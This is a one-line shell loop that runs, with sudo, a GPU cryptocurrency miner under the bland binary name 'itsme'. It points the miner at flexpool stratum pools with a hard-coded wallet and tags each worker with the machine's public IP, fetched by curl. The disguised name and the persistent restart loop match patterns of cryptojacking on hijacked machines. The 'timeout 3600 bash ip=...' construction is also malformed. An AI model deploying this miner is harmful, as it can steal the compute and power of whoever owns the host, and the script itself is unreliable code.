while :; do timeout 3600 bash ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./itsme -a ethash -w 0xF0529F3c3abD43252BF3BE801A9DBCBf435A4b2B -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io:4444 -r $ip --nvidia 1; sleep 30; done